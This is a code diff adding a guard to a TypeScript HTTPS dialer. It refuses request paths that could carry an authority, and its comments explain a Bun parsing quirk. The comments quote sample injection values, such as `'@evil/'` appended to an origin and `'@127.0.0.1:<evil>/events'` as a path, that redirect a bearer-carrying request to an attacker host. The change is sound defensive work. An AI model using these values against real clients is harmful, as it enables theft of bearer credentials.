@@ -228,18 +228,42 @@ export function hostAuthority(target: RemoteTarget): string {
  * None of that machinery has anything to connect to now: the host is a public
  * HTTPS origin, which every runtime's client can dial directly.
  */
+/**
+ * The one shape a request target may take on this hop: origin-form.
+ *
+ * Not a style rule — it is the whole of the anti-exfiltration property, and it
+ * has to be enforced HERE because neither of the two things that look like they
+ * enforce it actually do under the runtime Myco ships.
+ *
+ * `https.request(origin + path)` reparses, so `'https://host:8443' + '@evil/'`
+ * yields origin `https://evil` with the real host demoted to userinfo. Moving to
+ * the options form (`{hostname, port, path}`) looks like it fixes that — under
+ * Node it does, because llhttp refuses a target whose first byte is `@` and the
+ * options form pins the authority. **Bun does neither.** With `hostname` and
+ * `port` set correctly, Bun still opens the connection to an authority embedded
+ * in `path`: measured, `path: '@127.0.0.1:<evil>/events'` reaches `<evil>`
+ * while `req.host`/`req.port` report the real target. Myco ships as a Bun
+ * binary, so a guard that relies on Node's parser guards nothing.
+ *
+ * Since this hop attaches the host bearer (`buildForwardHeaders`), an
+ * off-origin dial is bearer exfiltration. `Dialer` is a public seam and places
+ * no constraint on `opts.path`, so the check belongs at the dial, not in the
+ * discipline of callers.
+ */
+function assertOriginFormPath(path: string): void {
+  // `//host/x` is a protocol-relative authority; `/x` is a path. Everything
+  // that is not unambiguously the latter is refused.
+  if (!path.startsWith('/') || path.startsWith('//')) {
+    throw new Error(
+      `Refusing to dial a host with a non-origin-form request target (${JSON.stringify(path.slice(0, 80))}): `
+      + 'a request target that can carry an authority could move this bearer-carrying request off the host.',
+    );
+  }
+}
+
 export const defaultDial: Dialer = (target, opts) => {
   const { hostname, port } = parseHostUrl(target.host.host_url);
-  // Origin passed as FIELDS, never as a concatenated URL string.
-  //
-  // `https.request(origin + path)` reparses the result, and a request target is
-  // caller-influenced: `'https://host:8443' + '@evil.com/'` reparses to origin
-  // `https://evil.com`, and this hop attaches the host bearer. That exact
-  // string is unreachable today — llhttp rejects a target starting with `@`,
-  // and every other escaping form produces an invalid port against `:8443` —
-  // but both defences are accidents of other components, and neither is stated
-  // or tested anywhere. Handing `hostname`/`port` separately makes the request
-  // structurally incapable of leaving this origin: `path` is only ever a path.
+  assertOriginFormPath(opts.path);
   return https.request({
     protocol: 'https:',
     hostname,
